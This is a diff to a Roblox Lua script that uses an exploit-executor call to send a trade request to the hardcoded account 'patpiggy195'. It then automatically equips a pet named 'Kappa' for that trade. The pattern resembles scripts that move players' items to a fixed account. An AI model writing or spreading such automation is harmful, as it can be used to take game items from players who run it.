@@ -6,10 +6,20 @@ local Backpack = LocalPlayer:WaitForChild("Backpack")
 
 local targetUsername = "patpiggy195"
 
--- Function to find Trading Ticket in inventory (partial name match)
+-- Find Trading Ticket in inventory
 local function findTradingTicket()
     for _, item in ipairs(Backpack:GetChildren()) do
         if item:IsA("Tool") and string.find(item.Name:lower(), "trading ticket") then
+            return item
+        end
+    end
+    return nil
+end
+
+-- Find Pet Named "Kappa" in inventory
+local function findPetKappa()
+    for _, item in ipairs(Backpack:GetChildren()) do
+        if item:IsA("Tool") and item.Name == "Kappa" then
             return item
         end
     end
@@ -34,6 +44,12 @@ if not tradingTicket then
     return
 end
 
+local petKappa = findPetKappa()
+if not petKappa then
+    warn("No pet named 'Kappa' found in inventory!")
+    return
+end
+
 if Humanoid then
     Humanoid:EquipTool(tradingTicket)
 end
@@ -51,3 +67,14 @@ end
 prompt.HoldDuration = 0.2
 fireproximityprompt(prompt)
 print("Trade request sent!")
+
+-- Wait a short moment to ensure trade UI is open (adjust timing if needed)
+wait(1)
+
+-- Equip and send pet named "Kappa"
+if Humanoid then
+    Humanoid:EquipTool(petKappa)
+    print("Pet 'Kappa' equipped for trade.")
+else
+    warn("Humanoid not found.")
+end
